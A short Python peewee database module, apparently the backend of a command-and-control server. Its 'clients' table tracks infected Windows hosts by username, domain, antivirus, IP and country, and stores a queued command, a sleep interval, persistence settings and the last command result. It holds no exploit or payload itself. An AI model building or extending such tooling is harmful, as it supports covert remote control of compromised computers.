from peewee import *

################### DB

# استفاده از DatabaseProxy
db_proxy = DatabaseProxy()


class BaseModel(Model):
    class Meta:
        database = db_proxy


class Client(BaseModel):
    ID = AutoField()
    Username = CharField(null=True)
    Domain = CharField(null=True)
    Av = CharField(null=True)
    Windows = CharField(null=True)
    Computer = CharField(null=True)
    last_seen = DateTimeField(null=True)
    
    ip = CharField(null=True)
    country = CharField(null=True)
    command = TextField(default="0")
    sleep = TextField(default="8")
    

    persist = TextField(default="0")
    persistfile = TextField(null=True)
    last_result = TextField(null=True)

    class Meta:
        table_name = "clients"


def initial_db():
    database = SqliteDatabase('clients.db')
    db_proxy.initialize(database)
    database.connect(reuse_if_open=True)
    database.create_tables([Client])
    _ensure_column(database, "clients", "last_result", "TEXT")


def _ensure_column(database, table_name, column_name, column_type):
    columns = [row.name for row in database.get_columns(table_name)]
    if column_name in columns:
        return
    database.execute_sql(
        f"ALTER TABLE {table_name} ADD COLUMN {column_name} {column_type}"
    )
